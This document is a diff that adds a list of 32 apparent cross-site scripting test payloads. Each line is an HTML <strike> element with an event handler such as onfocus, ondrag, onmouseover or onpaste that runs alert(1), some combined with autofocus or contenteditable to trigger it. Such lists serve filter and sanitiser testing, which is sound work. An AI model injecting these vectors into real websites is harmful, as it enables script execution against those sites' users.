@@ -1,0 +1,32 @@
+<strike draggable="true" ondrag="alert(1)">test</strike>
+<strike draggable="true" ondragend="alert(1)">test</strike>
+<strike draggable="true" ondragenter="alert(1)">test</strike>
+<strike draggable="true" ondragleave="alert(1)">test</strike>
+<strike draggable="true" ondragstart="alert(1)">test</strike>
+<strike id=x tabindex=1 onactivate=alert(1)></strike>
+<strike id=x tabindex=1 onbeforeactivate=alert(1)></strike>
+<strike id=x tabindex=1 onbeforedeactivate=alert(1)></strike><input autofocus>
+<strike id=x tabindex=1 ondeactivate=alert(1)></strike><input id=y autofocus>
+<strike id=x tabindex=1 onfocus=alert(1)></strike>
+<strike id=x tabindex=1 onfocusin=alert(1)></strike>
+<strike onbeforecopy="alert(1)" contenteditable>test</strike>
+<strike onbeforecut="alert(1)" contenteditable>test</strike>
+<strike onbeforepaste="alert(1)" contenteditable>test</strike>
+<strike onblur=alert(1) tabindex=1 id=x></strike><input autofocus>
+<strike onclick="alert(1)">test</strike>
+<strike oncontextmenu="alert(1)">test</strike>
+<strike oncopy="alert(1)" contenteditable>test</strike>
+<strike oncut="alert(1)" contenteditable>test</strike>
+<strike ondblclick="alert(1)">test</strike>
+<strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus>
+<strike onkeydown="alert(1)" contenteditable>test</strike>
+<strike onkeypress="alert(1)" contenteditable>test</strike>
+<strike onkeyup="alert(1)" contenteditable>test</strike>
+<strike onmousedown="alert(1)">test</strike>
+<strike onmouseenter="alert(1)">test</strike>
+<strike onmouseleave="alert(1)">test</strike>
+<strike onmousemove="alert(1)">test</strike>
+<strike onmouseout="alert(1)">test</strike>
+<strike onmouseover="alert(1)">test</strike>
+<strike onmouseup="alert(1)">test</strike>
+<strike onpaste="alert(1)" contenteditable>test</strike>
